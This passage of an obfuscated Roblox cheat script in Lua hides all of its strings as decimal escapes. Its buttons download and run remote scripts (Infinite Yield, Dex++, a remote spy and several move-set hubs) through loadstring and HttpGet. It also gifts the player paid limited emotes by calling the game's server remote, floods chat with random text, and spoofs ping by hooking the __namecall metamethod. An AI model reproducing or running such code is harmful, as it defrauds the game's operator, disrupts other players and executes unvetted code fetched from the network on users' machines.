 _IlIlIllIlI:AddDropdown("\076\101\097\118\101\079\110\068\114\111\112\100\111\119\110", { Text = "\076\101\097\118\101\032\079\110", Multi = true, Default = {}, Values = { "\083\116\097\102\102", "\083\112\101\099\105\097\108\032\080\101\111\112\108\101", "\070\114\105\101\110\100\115\032\119\105\116\104\032\083\116\097\102\102" }, }) local _lIIIllllII = Players.PlayerAdded:Connect( function (_lIIlIIlllI) task.spawn(pcall, _IlIIllIIlI, _lIIlIIlllI) end
 ) for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do task.spawn(pcall, _IlIIllIIlI, _lIIlIIlllI) end
 table.insert(_IllIllIIll, function () if _lIIIllllII then _lIIIllllII:Disconnect() _lIIIllllII = nil end
 end
 ) local _IlIlllllII = TabMiscScripts _IlIlllllII:AddButton({ Text = "\073\110\102\105\110\105\116\101\032\089\105\101\108\100", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\069\100\103\101\073\089\047\105\110\102\105\110\105\116\101\121\105\101\108\100\047\109\097\115\116\101\114\047\115\111\117\114\099\101", true))() end
 }) _IlIlllllII:AddButton({ Text = "\068\101\120\043\043", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\103\105\116\104\117\098\046\099\111\109\047\065\090\089\115\071\105\116\104\117\098\047\068\101\120\080\108\117\115\080\108\117\115\047\114\101\108\101\097\115\101\115\047\108\097\116\101\115\116\047\100\111\119\110\108\111\097\100\047\111\117\116\046\108\117\097"))() end
 }) _IlIlllllII:AddButton({ Text = "\067\111\098\097\108\116\032\082\101\109\111\116\101\032\083\112\121", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\103\105\116\104\117\098\046\099\111\109\047\110\111\116\112\111\105\117\047\099\111\098\097\108\116\047\114\101\108\101\097\115\101\115\047\108\097\116\101\115\116\047\100\111\119\110\108\111\097\100\047\067\111\098\097\108\116\046\108\117\097\117"))() end
 }) do local _lIlIllllll = {} local _IIIIlIlIll = false local _IIlllIIIlI = false _IlIlllllII:AddButton({ Text = "\066\121\112\097\115\115\032\076\105\109\105\116\101\100\032\069\109\111\116\101\115\032\084\105\109\101\114", Tooltip = "\065\108\108\111\119\115\032\121\111\117\032\116\111\032\112\117\114\099\104\097\115\101\032\097\110\121\032\108\105\109\105\116\101\100\032\101\109\111\116\101\032\097\116\032\097\110\121\032\116\105\109\101\046", Func = function () task.spawn( function () pcall( function () local _lllllIIlII = game:GetService("\077\097\114\107\101\116\112\108\097\099\101\083\101\114\118\105\099\101") local _llIIIIlllI = require(game.ReplicatedStorage.Info) local _IlllIlIIIl = "\123\034\105\116\101\109\115\034\058\091" local _llIIIlIIIl = {} for _lIIlIllIlI, _IIIlIIlIll in _llIIIIlllI.Limited do _llIIIlIIIl[_IIIlIIlIll.Name] = _IIIlIIlIll.ID end
 local _IIlIIlIIII = 0x1 local _IllIllIIll, _IIllIllIll = pcall( function () return _lllllIIlII:GetDeveloperProductsAsync():GetCurrentPage() end
 ) if _IllIllIIll then for _lIIlIllIlI, j in ipairs(_IIllIllIll) do if _llIIIlIIIl[j.Name] then _IlllIlIIIl = _IlllIlIIIl .. string.format("\123\034\078\117\109\098\101\114\034\058\037\100\044\034\073\109\097\103\101\034\058\037\100\044\034\078\097\109\101\034\058\034\037\115\034\044\034\080\114\105\099\101\034\058\037\100\044\034\073\068\034\058\037\100\125\044", _IIlIIlIIII, j.IconImageAssetId or 0x0, j.Name, j.PriceInRobux or 0x0, j.ProductId) _IIlIIlIIII = _IIlIIlIIII + 0x1 local _IIIlIIIIll = j.Name .. "\032\032\124\032\032" .. tostring(j.PriceInRobux or "\063") .. "\032\082\036" _lIlIllllll[_IIIlIIIIll] = { gamepassId = _llIIIlIIIl[j.Name] } end
 end
 if _IlllIlIIIl:sub(-0x1) == "\044" then _IlllIlIIIl = _IlllIlIIIl:sub(0x1,-0x2) end
 _IlllIlIIIl = _IlllIlIIIl .. "\093\044\034\105\110\102\111\034\058\123\034\115\101\099\111\110\100\115\073\110\087\101\101\107\034\058\054\048\052\056\048\048\044\034\115\116\097\114\116\079\102\089\101\097\114\034\058\049\055\051\053\055\051\050\056\048\048\044\034\099\117\114\114\101\110\116\087\101\101\107\034\058\050\051\125\125" workspace:SetAttribute("\076\105\109\105\116\101\100", _IlllIlIIIl) local _llIlIIIllI = game.Players.LocalPlayer local _lIIlllIIII = _llIlIIIllI.PlayerGui.Emotes.ImageLabel.Limited.List for _lIIlIllIlI, _IllIIIllII in ipairs(_lIIlllIIII:GetChildren()) do if _IllIIIllII:IsA("\073\109\097\103\101\066\117\116\116\111\110") then _IllIIIllII.MouseButton1Click:Connect( function () local _IllIIlllIl = _IllIIIllII:GetAttribute("\073\068") if _IllIIlllIl then local _IIIllllllI = {{ Goal = "\071\105\102\116\032\071\097\109\101\112\097\115\115", GiftData = { Receiver = _llIlIIIllI.UserId, Gamepass = _IllIIlllIl } }} _llIlIIIllI.Character:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101"):FireServer(unpack(_IIIllllllI)) end
 end
 ) end
 end
 _IIIIlIlIll = true if not _IIlllIIIlI then _IIlllIIIlI = true _IlIlllllII:AddLabel("\083\101\108\101\099\116\032\097\110\032\101\109\111\116\101\032\116\111\032\112\117\114\099\104\097\115\101\032\040\117\115\101\032\116\104\105\115\032\105\102\032\116\104\101\032\101\109\111\116\101\032\105\115\032\110\111\116\032\118\105\115\105\098\108\101\032\105\110\032\116\104\101\032\100\101\102\097\117\108\116\032\084\083\066\032\085\073\041\058", true) local _lIIIllIIll = {} for _IIIlIIIIll in pairs(_lIlIllllll) do table.insert(_lIIIllIIll, _IIIlIIIIll) end
 _IlIlllllII:AddDropdown("\076\105\109\105\116\101\100\069\109\111\116\101\068\114\111\112\100\111\119\110", { Values = _lIIIllIIll, Default = 0x1, Multi = false, Text = "\069\109\111\116\101", }) _IlIlllllII:AddButton({ Text = "\066\117\121", Func = function () local _lIlIIIlIlI = _lIIlIllIlI.LimitedEmoteDropdown and _lIIlIllIlI.LimitedEmoteDropdown.Value local _IIlIllIIII = _lIlIIIlIlI and _lIlIllllll[_lIlIIIlIlI] if not _IIlIllIIII then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\076\105\109\105\116\101\100\032\069\109\111\116\101\115"), Content = "\069\109\111\116\101\032\110\111\116\032\102\111\117\110\100\046", _IlllIlIllI = 0x3 }) return end
 pcall( function () local _IIIlllIlIl = {{ Goal = "\071\105\102\116\032\071\097\109\101\112\097\115\115", GiftData = { Receiver = _llIlIIlIll.UserId, Gamepass = _IIlIllIIII.gamepassId } }} _llIlIIlIll.Character:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101"):FireServer(unpack(_IIIlllIlIl)) end
 ) end
 }) end
 end
 end
 ) end
 ) end
 , }) end
 _IlIlllllII:AddDivider() _IlIlllllII:AddButton({ Text = "\075\097\100\101\032\071\111\106\111\032\086\049", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\109\105\105\107\105\099\111\109\115\111\110\111\047\066\097\108\100\121\084\111\083\111\114\099\101\114\101\114\070\105\120\101\100\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\086\049\046\108\117\097"))() end
 }) _IlIlllllII:AddButton({ Text = "\075\097\100\101\032\071\111\106\111\032\086\050\032\040\077\111\114\112\104\041", Func = function () getgenv().morph = true loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\107\105\098\105\100\105\116\111\105\108\101\116\102\097\110\050\048\048\055\047\066\097\108\100\121\084\111\083\111\114\099\101\114\101\114\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\076\097\116\101\115\116\086\050\046\108\117\097"))() end
 }) _IlIlllllII:AddButton({ Text = "\075\097\100\101\032\071\111\106\111\032\086\050\032\040\078\111\032\077\111\114\112\104\041", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\107\105\098\105\100\105\116\111\105\108\101\116\102\097\110\050\048\048\055\047\066\097\108\100\121\084\111\083\111\114\099\101\114\101\114\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\076\097\116\101\115\116\086\050\046\108\117\097"))() end
 }) _IlIlllllII:AddButton({ Text = "\083\097\105\116\097\109\097\032\079\118\101\114\104\097\117\108", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\107\105\098\105\100\105\116\111\105\108\101\116\102\097\110\050\048\048\055\047\083\097\105\116\097\109\097\079\118\101\114\104\097\117\108\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\076\097\116\101\115\116\046\108\117\097"))() end
 }) _IlIlllllII:AddButton({ Text = "\083\116\097\114\032\071\108\105\116\099\104\101\114", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\103\105\115\116\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\107\101\108\108\101\114\116\104\101\109\097\110\103\111\047\099\049\054\099\099\102\052\054\051\055\101\049\056\049\050\050\048\049\055\048\052\100\057\100\056\056\055\102\051\051\054\099\047\114\097\119\047\115\116\097\114\037\050\053\050\048\102\097\114\116\101\114"))() end
 }) _IlIlllllII:AddButton({ Text = "\075\097\100\101\074\032\047\032\075\097\105\116\097\109\097\074", Func = function () getgenv().Moveset_Settings = { ExecuteOnRespawn = false, TSBStyleNotification = true, UseOldCollateralRuin = true, NoWarning = false, NoDeathCounterImages = false, NoBarrageArms = true, NoPreysPerilAttract = false, NoWalls = false, NoTrees = false, RavageTool = false, AdrenalineBoostTool = false, Adrenaline_Multiplier = 0x2, CustomUppercutAnimation = true, CustomDownslamAnimation = true, CustomIdleAnimation = true, UltNames = { "\050\048\032\083\069\082\073\069\083", "\067\079\077\069\032\065\084\032\077\069", "\073\039\077\032\068\079\078\069" }, MoveNames = { ["\078\111\114\109\097\108\032\080\117\110\099\104"] = "\082\097\118\097\103\105\110\103\032\075\105\099\107", ["\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115"] = "\070\105\115\116\032\070\117\115\105\108\108\097\100\101", Shove = "\083\119\105\102\116\032\083\119\101\101\112", Uppercut = "\067\111\108\108\097\116\101\114\097\108\032\083\116\111\114\109", ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = "\083\117\100\100\101\110\032\083\116\114\105\107\101", ["\084\097\098\108\101\032\070\108\105\112"] = "\083\116\111\105\099\032\066\111\109\098", ["\083\101\114\105\111\117\115\032\080\117\110\099\104"] = "\068\101\115\116\114\117\099\116\105\118\101\032\080\111\119\101\114", ["\079\109\110\105\032\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104"] = "\079\109\110\105\032\068\105\114\101\099\116\105\111\110\097\108\032\070\105\115\116\115", }, } loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\107\105\098\105\100\105\116\111\105\108\101\116\102\097\110\050\048\048\055\047\066\097\108\100\121\084\111\075\074\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\076\097\116\101\115\116\046\108\117\097"))() end
 }) _IlIlllllII:AddButton({ Text = "\068\111\118\105\032\072\117\098", Func = function () pcall( function () setclipboard("\113\098\055\072\076\099\113\118\050\111\053\114\100\078\122\112\101\070\098\089") end
 ) _IIIllIIlll:Notify({ Title = _IlIIIlllII("\068\111\118\105\032\072\117\098"), Content = "\067\111\112\105\101\100\032\075\101\121", _IlllIlIllI = 0x3 }) task.delay(0x2, function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\110\101\101\100\097\110\101\119\112\104\111\110\101\051\050\045\101\110\103\047\116\115\098\102\105\108\101\115\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\077\097\105\110\049\046\108\117\097"))() end
 ) end
 }) do local function _llIIIllIIl(_llIIIIIlll) local _lIIIlIlIlI = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101") if _lIIIlIlIlI.ChatVersion == Enum.ChatVersion.TextChatService then local _IlIIIIIllI = _lIIIlIlIlI.TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _IlIIIIIllI then pcall( function () _IlIIIIIllI:SendAsync(_llIIIIIlll) end
 ) end
 else local _llIlIlllIl = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101"):FindFirstChild("\068\101\102\097\117\108\116\067\104\097\116\083\121\115\116\101\109\067\104\097\116\069\118\101\110\116\115") local _lllIlIllIl = _llIlIlllIl and _llIlIlllIl:FindFirstChild("\083\097\121\077\101\115\115\097\103\101\082\101\113\117\101\115\116") if _llIlIlllIl and _lllIlIllIl then pcall( function () _lllIlIllIl:FireServer(_llIIIIIlll, "\097\108\108") end
 ) end
 end
 end
 local function _IlIlllllII(_IllIIlllIl) local _IIIlIIIIll = "\097\098\099\100\101\102\103\104\105\106\107\108\109\110\111\112\113\114\115\116\117\118\119\120\121\122\065\066\067\068\069\070\071\072\073\074\075\076\077\078\079\080\081\082\083\084\085\086\087\088\089\090" local _IIIlIIIIIl = "" for _lIIlIllIlI = 0x1, (_IllIIlllIl or math.random(0x3, 0x14)) do local _IIllIllIll = math.random(0x1, #_IIIlIIIIll) _IIIlIIIIIl = _IIIlIIIIIl .. _IIIlIIIIll:sub(_IIllIllIll, _IIllIllIll) end
 return _IIIlIIIIIl end
 if TabMiscExtra then do local _IIIllllIIl = {} local _IllIIllIIl = nil local _IlllIIIlIl = {} local _lIlIIIlIIl = { "\075\105\108\108\115", "\084\111\116\097\108\032\075\105\108\108\115" } local function _IIllIIlIIl(_IlIlIIIlII) task.spawn( function () local _IIIllIlIlI = _IlIlIIIlII:FindFirstChild("\108\101\097\100\101\114\115\116\097\116\115") or _IlIlIIIlII:WaitForChild("\108\101\097\100\101\114\115\116\097\116\115", 0xA) if not _IIIllIlIlI then return end
 if not _IIIllllIIl[_IlIlIIIlII] then _IIIllllIIl[_IlIlIIIlII] = {} end
 for _lIIlIllIlI, _lIIIIllIIl in ipairs(_lIlIIIlIIl) do if not _IIIllIlIlI:FindFirstChild(_lIIIIllIIl) then local _lIllllllII = _IlIlIIIlII:FindFirstChild(_lIIIIllIIl) if _lIllllllII then _lIllllllII.Parent = _IIIllIlIlI _IIIllllIIl[_IlIlIIIlII][_lIIIIllIIl] = _lIllllllII end
 end
 end
 end
 ) end
 local function _lIIIllllII(_IlIlIIIlII) local _llllllIIlI = _IIIllllIIl[_IlIlIIIlII] if not _llllllIIlI then return end
 _IIIllllIIl[_IlIlIIIlII] = nil for _lIIlIllIlI, _lIllllllII in pairs(_llllllIIlI) do pcall( function () if _lIllllllII and _lIllllllII.Parent then _lIllllllII.Parent = _IlIlIIIlII end
 end
 ) end
 end
 local function _IlIlllllII(_IlIlIIIlII) if _IlllIIIlIl[_IlIlIIIlII] then pcall( function () _IlllIIIlIl[_IlIlIIIlII]:Disconnect() end
 ) end
 _IlllIIIlIl[_IlIlIIIlII] = _IlIlIIIlII.CharacterAdded:Connect( function () task.wait(0x1) _IIllIIlIIl(_IlIlIIIlII) end
 ) end
 TabMiscExtra:AddToggle("\083\104\111\119\072\105\100\100\101\110\075\105\108\108\115", { Text = "\083\104\111\119\032\072\105\100\100\101\110\032\075\105\108\108\115", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then for _lIIlIllIlI, _lIIlIIlllI in ipairs(Players:GetPlayers()) do _IIllIIlIIl(_lIIlIIlllI) _IlIlllllII(_lIIlIIlllI) end
 _IllIIllIIl = Players.PlayerAdded:Connect( function (_lIIlIIlllI) task.wait(0x1) _IIllIIlIIl(_lIIlIIlllI) _IlIlllllII(_lIIlIIlllI) end
 ) else if _IllIIllIIl then _IllIIllIIl:Disconnect() _IllIIllIIl = nil end
 for _lIIlIIlllI, _IllIIlIllI in pairs(_IlllIIIlIl) do pcall( function () _IllIIlIllI:Disconnect() end
 ) _IlllIIIlIl[_lIIlIIlllI] = nil end
 local _llIllIlllI = {} for _lIIlIIlllI in pairs(_IIIllllIIl) do _llIllIlllI[#_llIllIlllI + 0x1] = _lIIlIIlllI end
 for _lIIlIllIlI, _lIIlIIlllI in ipairs(_llIllIlllI) do _lIIIllllII(_lIIlIIlllI) end
 end
 end
 , }) end
 TabMiscExtra:AddToggle("\067\104\097\116\070\108\111\111\100\101\114", { Text = "\067\104\097\116\032\070\108\111\111\100\101\114", Default = false, Callback = function (_IIlIlIIlII) if not _IIlIlIIlII then return end
 task.spawn( function () while _llIIllIlll.ChatFlooder and _llIIllIlll.ChatFlooder.Value do _llIIIllIIl(_IlIlllllII(0xC8)) local _lllIllIIIl = tick() local delay = _lIIlIllIlI.ChatFlooderDelay and _lIIlIllIlI.ChatFlooderDelay.Value or 3.5 repeat task.wait() until tick() >= _lllIllIIIl + delay or not (_llIIllIlll.ChatFlooder and _llIIllIlll.ChatFlooder.Value) end
 end
 ) end
 , }) TabMiscExtra:AddSlider("\067\104\097\116\070\108\111\111\100\101\114\068\101\108\097\121", { Text = "\067\104\097\116\032\070\108\111\111\100\101\114\032\068\101\108\097\121", Default = 3.5, Min = 0.5, Max = 0x5, Rounding = 0x1, }) table.insert(_IllIllIIll, function () pcall( function () _llIIllIlll.ChatFlooder:SetValue(false) end
 ) end
 ) do local _lllIlIIlIl = nil local _IlllIllIll = nil local _IlIIIIlIlI = nil local function _llllIlIIII(_IIllIIlllI) if _IlllIllIll then pcall( function () _IlllIllIll:Disconnect() end
 ) _IlllIllIll = nil end
 if not _IIllIIlllI then return end
 local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lIlIllIlIl then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII then _lIlIIllIII:GetPropertyChangedSignal("\072\101\097\108\116\104"):Connect( function () if _lIlIIllIII.Health > 0x0 then return end
 if _IlllIllIll then pcall( function () _IlllIllIll:Disconnect() end
 ) _IlllIllIll = nil end
 local _IIIlIIIIIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIIIl then _lllIlIIlIl = _IIIlIIIIIl.Position end
 end
 ) end
 _IlllIllIll = RunService.Heartbeat:Connect( function () if _lIlIllIlIl.Parent then _lllIlIIlIl = _lIlIllIlIl.Position else pcall( function () _IlllIllIll:Disconnect() end
 ) _IlllIllIll = nil end
 end
 ) end
 TabMiscExtra:AddToggle("\083\097\118\101\080\111\115\079\110\068\101\097\116\104", { Text = "\083\097\118\101\032\080\111\115\105\116\105\111\110\032\111\110\032\068\101\097\116\104", Default = false, Risky = true, Tooltip = "\115\111\109\101\116\105\109\101\115\032\105\115\032\117\110\115\116\097\098\108\101\032\105\102\032\121\111\117\032\103\101\116\032\107\105\108\108\101\100\032\104\105\103\104\044\032\098\117\116\032\105\116\039\115\032\114\097\114\101\046", Callback = function (_IIlIlIIlII) if _IIlIlIIlII then _llllIlIIII(_llIlIIlIll.Character) _IlIIIIlIlI = _llIlIIlIll.CharacterAdded:Connect( function (newChar) local _IlIIlllIlI = _lllIlIIlIl task.spawn( function () local _lIlIllIlIl = newChar:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0xA) local _lIlIIllIII = newChar:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _lIlIllIlIl or not _lIlIIllIII then return end
 if _IlIIlllIlI then repeat task.wait() until _lIlIIllIII.Health > 0x0 and _lIlIIllIII:GetState() ~= Enum.HumanoidStateType.None and _lIlIIllIII:GetState() ~= Enum.HumanoidStateType.Dead pcall( function () _lIlIllIlIl.CFrame = CFrame.new(_IlIIlllIlI) end
 ) end
 _llllIlIIII(newChar) end
 ) end
 ) else if _IlllIllIll then pcall( function () _IlllIllIll:Disconnect() end
 ) _IlllIllIll = nil end
 if _IlIIIIlIlI then pcall( function () _IlIIIIlIlI:Disconnect() end
 ) _IlIIIIlIlI = nil end
 end
 end
 , }) table.insert(_IllIllIIll, function () pcall( function () _llIIllIlll.SavePosOnDeath:SetValue(false) end
 ) if _IlllIllIll then pcall( function () _IlllIllIll:Disconnect() end
 ) _IlllIllIll = nil end
 if _IlIIIIlIlI then pcall( function () _IlIIIIlIlI:Disconnect() end
 ) _IlIIIIlIlI = nil end
 end
 ) end
 do local _llllIIllIl = type(getrawmetatable) == "\102\117\110\099\116\105\111\110" and type(setreadonly) == "\102\117\110\099\116\105\111\110" and type(newcclosure) == "\102\117\110\099\116\105\111\110" and type(getnamecallmethod) == "\102\117\110\099\116\105\111\110" local _IIllIIIlIl = false local _IIIlIllIIl = nil local _IllllllIlI = nil local function _lllIllIllI() if _IIllIIIlIl or not _llllIIllIl then return end
 pcall( function () _IllllllIlI = getrawmetatable(game) setreadonly(_IllllllIlI, false) _IIIlIllIIl = _IllllllIlI.__namecall _IllllllIlI.__namecall = newcclosure( function (self, ...) local _llIlIIllIl = getnamecallmethod() if _llIlIIllIl == "\070\105\114\101\083\101\114\118\101\114" then local _IIIllllIlI = {...} if type(_IIIllllIlI[0x1]) == "\116\097\098\108\101" and _IIIllllIlI[0x1].Goal == "\082\101\112\111\114\116\080\105\110\103" then _IIIllllIlI[0x1].ms = tonumber(_lIIlIllIlI.PingSpoofMs and _lIIlIllIlI.PingSpoofMs.Value) or 0x0 return _IIIlIllIIl(self, unpack(_IIIllllIlI)) end
 end
 return _IIIlIllIIl(self, ...) end
 ) setreadonly(_IllllllIlI, true) _IIllIIIlIl = true end
 ) end
 local function _lIIlIllllI() if not _IIllIIIlIl or not _IllllllIlI or not _IIIlIllIIl then return end
 pcall( function () setreadonly(_IllllllIlI, false) _IllllllIlI.__namecall = _IIIlIllIIl setreadonly(_IllllllIlI, true) end
 ) _IIllIIIlIl = false _IIIlIllIIl = nil end
 local _IlIlIllIlI = "\121\111\117\114\032\101\120\101\099\117\116\111\114\032\100\111\101\115\110\039\116\032\115\117\112\112\111\114\116\032\116\104\105\115" TabMiscLeaderboard:AddToggle("\080\105\110\103\083\112\111\111\102", { Text = "\080\105\110\103\032\083\112\111\111\102\101\114", Default = false, Disabled = not _llllIIllIl, Tooltip = not _llllIIllIl and _IlIlIllIlI or nil, Callback = function (_IIlIlIIlII) if not _llllIIllIl then pcall( function () _llIIllIlll.PingSpoof:SetValue(false) end
 ) return end
 if _IIlIlIIlII then _lllIllIllI() else _lIIlIllllI() end
 end
 , }) TabMiscLeaderboard:AddInput("\080\105\110\103\083\112\111\111\102\077\115", { Text = "\083\112\111\111\102\101\100\032\080\105\110\103\032\040\109\115\041", Default = "\048", Placeholder = "\069\110\116\101\114\032\109\115\046\046\046", Numeric = true, Disabled = not _llllIIllIl, Tooltip = not _llllIIllIl and _IlIlIllIlI or nil, }) table.insert(_IllIllIIll, function () pcall( function () _llIIllIlll.PingSpoof:SetValue(false) end
 ) _lIIlIllllI() end
 ) end
 end
 end
 do local _IllllIIlII = _IlIlIIllII local _IlllllIllI = { Bald = {"\049\048\052\054\057\052\057\051\050\055\048","\049\048\052\054\057\054\051\048\057\053\048","\049\048\052\054\057\054\051\057\050\050\050","\049\048\052\054\057\054\052\051\054\052\051"}, Hunter = {"\049\051\053\051\050\053\054\050\052\049\056","\049\051\053\051\050\054\048\048\049\050\053","\049\051\053\051\050\054\048\052\048\056\053","\049\051\050\057\052\052\055\049\057\054\054"}, Monster = {"\049\050\050\052\056\050\052\057\050\051\054\052\048\051\054","\049\050\053\056\056\050\054\054\055\052\048\054\051\052\055","\049\051\052\056\050\050\054\051\049\056\053\051\055\055\048","\055\054\054\048\050\049\051\056\057\052\048\048\051\051"}, ZombieAxe = {"\049\050\053\051\054\049\052\057\057\056\050\055\054\054\051","\049\048\053\055\048\049\052\051\050\051\052\052\057\053\051","\049\048\052\050\057\051\052\051\057\050\054\049\051\051\051","\049\049\052\052\054\048\057\057\050\048\053\055\051\053\051"}, ZombieDeagle= {"\049\049\049\054\052\052\052\053\053\048\054\054\051\054\049","\049\049\050\055\055\056\057\051\051\048\054\054\051\055\052","\056\048\052\056\056\052\055\048\053\055\055\049\056\049","\049\049\055\055\050\054\053\050\049\050\057\052\049\053\048"}, ZombieShotgun={"\057\055\055\048\050\050\051\052\057\055\055\050\048\057","\049\051\054\056\051\052\054\048\054\054\056\055\048\049\052","\049\051\055\053\053\054\054\050\048\054\055\053\052\055\052","\049\049\053\052\048\054\049\051\052\054\048\048\051\057\053"}, Purple = {"\049\055\056\056\057\052\053\056\053\054\051","\049\055\056\056\057\052\054\049\056\049\048","\049\055\056\056\057\052\055\049\048\057\056","\049\055\056\056\057\050\057\048\053\054\057"}, Cyborg = {"\049\051\052\057\049\054\051\053\052\051\051","\049\051\050\057\054\053\055\055\055\056\051","\049\051\050\057\053\057\049\057\051\057\057","\049\051\050\057\053\057\051\054\056\054\054"}, Ninja = {"\049\051\051\055\048\051\049\048\053\049\051","\049\051\051\057\048\050\051\048\057\055\051","\049\051\051\055\056\055\053\049\055\049\055","\049\051\051\055\056\055\048\056\049\057\057"}, Batter = {"\049\052\048\048\052\050\050\050\057\056\053","\049\051\057\057\055\048\057\050\057\052\048","\049\052\048\048\049\057\054\051\052\048\049","\049\052\049\051\054\052\051\054\049\053\055"}, Blade = {"\049\053\050\053\057\049\054\049\051\057\048","\049\053\050\052\048\050\049\054\057\051\049","\049\053\050\052\048\049\055\054\056\055\051","\049\053\049\054\050\054\057\052\049\057\050"}, Esper = {"\049\054\053\049\053\053\048\051\053\048\055","\049\054\053\049\053\053\050\048\052\051\049","\049\054\053\049\053\052\052\056\048\056\057","\049\054\053\053\050\050\051\052\053\057\048"}, KJ = {"\049\055\051\050\053\053\049\048\048\048\050","\049\055\051\050\053\053\049\051\056\055\048","\049\055\051\050\053\053\050\050\051\056\056","\049\055\051\050\053\053\051\055\055\049\057"}, Tech = {"\049\050\051\048\048\053\054\050\057\052\051\049\051\048\057","\049\048\048\048\053\057\056\055\052\051\053\049\054\054\052","\049\048\052\056\057\053\051\055\057\052\049\054\051\052\050","\049\051\052\055\055\053\052\048\054\052\051\055\054\050\054"}, Lightning = {"\056\057\048\052\052\048\054\055\055\057\055\057\054\052","\055\052\051\051\052\049\057\052\056\051\055\057\049\056","\057\052\051\053\051\056\052\053\057\055\052\049\051\049","\056\048\054\048\049\050\051\057\049\051\057\055\055\052"}, Brother = {"\049\048\053\053\048\057\054\054\053\048\049\057\048\052\048","\049\049\050\053\053\055\054\048\057\050\049\053\048\048\056","\057\049\055\055\049\049\054\048\052\057\057\052\053\050","\049\050\048\048\050\054\057\053\050\057\052\056\051\051\050"}, Emerge = {"\049\051\050\056\054\056\049\056\053\055\057\052\057\054\054","\049\049\054\050\051\057\056\056\053\053\057\055\053\053\056","","\056\057\052\052\051\055\052\056\048\050\050\057\054\054"}, } local _lIIIIIllll = {} for _lIIlIllIlI, _lIIIIIlIll in pairs(_IlllllIllI) do for _IIIIlllIlI, _IlIIIllllI in ipairs(_lIIIIIlIll) do _lIIIIIllll[_IlIIIllllI] = _IIIIlllIlI end
 end
 local _IIllllIIlI = { "\068\101\102\097\117\108\116","\082\097\110\100\111\109", "\083\097\105\116\097\109\097","\071\097\114\111\117","\083\117\105\114\121\117", "\071\101\110\111\115","\083\111\110\105\099","\077\101\116\097\108\032\066\097\116","\065\116\111\109\105\099\032\083\097\109\117\114\097\105", "\084\097\116\115\117\109\097\107\105","\075\074","\067\104\105\108\100\032\069\109\112\101\114\111\114","\076\105\103\104\116\110\105\110\103\032\077\097\120","\077\121\032\066\114\111\116\104\101\114", "\077\111\110\115\116\101\114\032\071\097\114\111\117", "\090\111\109\098\105\101\032\077\097\110\032\040\065\120\101\041","\090\111\109\098\105\101\032\077\097\110\032\040\068\101\097\103\108\101\041","\090\111\109\098\105\101\032\077\097\110\032\040\083\104\111\116\103\117\110\041", "\069\109\101\114\103\101", } local _IIllIIllll = { "\066\097\108\100","\072\117\110\116\101\114","\080\117\114\112\108\101","\067\121\098\111\114\103", "\078\105\110\106\097","\066\097\116\116\101\114","\066\108\097\100\101","\069\115\112\101\114","\075\074","\084\101\099\104","\076\105\103\104\116\110\105\110\103", } local _IIIIIIIlIl = { ["\083\097\105\116\097\109\097"]="\066\097\108\100",["\071\097\114\111\117"]="\072\117\110\116\101\114",["\077\111\110\115\116\101\114\032\071\097\114\111\117"]="\077\111\110\115\116\101\114", ["\083\117\105\114\121\117"]="\080\117\114\112\108\101",["\071\101\110\111\115"]="\067\121\098\111\114\103",["\083\111\110\105\099"]="\078\105\110\106\097", ["\077\101\116\097\108\032\066\097\116"]="\066\097\116\116\101\114",["\065\116\111\109\105\099\032\083\097\109\117\114\097\105"]="\066\108\097\100\101", ["\084\097\116\115\117\109\097\107\105"]="\069\115\112\101\114",["\075\074"]="\075\074",["\067\104\105\108\100\032\069\109\112\101\114\111\114"]="\084\101\099\104", ["\076\105\103\104\116\110\105\110\103\032\077\097\120"]="\076\105\103\104\116\110\105\110\103", ["\077\121\032\066\114\111\116\104\101\114"]="\066\114\111\116\104\101\114", 